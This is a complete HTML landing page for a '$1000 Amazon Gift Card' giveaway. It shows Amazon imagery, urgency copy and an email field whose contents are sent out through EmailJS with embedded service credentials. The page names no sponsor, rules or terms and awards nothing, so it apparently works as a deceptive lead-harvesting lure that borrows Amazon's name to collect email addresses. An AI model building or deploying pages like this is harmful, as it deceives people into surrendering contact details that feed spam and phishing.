<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>$1 000 Amazon Gift‑Card Giveaway</title>

  <!-- Google Font -->
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">

  <style>
    /* ====== Global ====== */
    *{box-sizing:border-box;margin:0;padding:0}
    body{
      font-family:'Poppins',sans-serif;
      background:#eef5f8;
      color:#333;
    }

    /* ====== Top banner ====== */
    .topbar{
      background:#002742;
      color:#fff;
      text-align:center;
      font-size:26px;
      font-weight:600;
      padding:14px 8px;
    }

    /* ====== Card ====== */
    .wrapper{display:flex;justify-content:center;padding:40px 16px}
    .card{
      background:#fff;
      border-radius:16px;
      padding:34px 24px 40px;
      max-width:500px;width:100%;
      box-shadow:0 12px 24px rgba(0,0,0,.08);
      text-align:center;
    }

    h1{font-size:32px;color:#e48c00;margin-bottom:12px;font-weight:600}
    p.tagline{font-size:18px;margin-bottom:22px;line-height:1.6}

    /* ====== Gift‑card image ====== */
    .gift-img{width:100%;max-width:380px;margin:0 auto 28px;border-radius:8px}

    /* ====== Form ====== */
    form{display:flex;flex-direction:column;gap:16px}
    input[type="email"]{
      padding:14px 16px;
      font-size:16px;
      border:2px solid #ddd;
      border-radius:8px;
      outline:none;
      transition:.25s;
      width:100%;
    }
    input[type="email"]:focus{border-color:#e48c00}

    button{
      background:#e7a308;
      color:#fff;
      font-size:20px;
      font-weight:600;
      padding:14px 0;
      border:none;
      border-radius:8px;
      cursor:pointer;
      transition:.25s;
    }
    button:hover{background:#d49105}
  </style>
</head>
<body>

  <div class="topbar">Limited‑Time Giveaway</div>

  <div class="wrapper">
    <div class="card">
      <h1>Win a $1000 Amazon Gift Card!</h1>
      <p class="tagline">
        Enter your email below and claim your chance. This offer won’t last long!
      </p>

      <!-- Gift‑card image (يتم تحميلها مباشرة من Amazon) -->
      <img class="gift-img"
           src="https://m.media-amazon.com/images/I/41uXg1mf4mL._AC_.jpg"
           alt="Amazon Gift Card">

      <!-- ====== Form ====== -->
      <form id="leadForm">
        <input type="email" id="user_email" name="user_email"
               placeholder="Enter your email" required>

        <button type="submit">Claim Now</button>
      </form>
    </div>
  </div>

  <!-- EmailJS SDK -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    // 1‑ Init with your Public Key
    emailjs.init('UWtEugL5TIC6RfnFv');

    // 2‑ Handle form submit
    const form = document.getElementById('leadForm');
    form.addEventListener('submit', function (e) {
      e.preventDefault();

      const serviceID  = 'service_htt7fgh';      // Service ID
      const templateID = 'template_9exxth7';     // Template ID

      emailjs.sendForm(serviceID, templateID, this)
        .then(() => {
          // success → go to thank‑you page
          window.location.href = 'thankyou.html';
        })
        .catch((err) => {
          console.error(err);
          alert('Error, please try again later');
        });
    });
  </script>
</body>
</html>
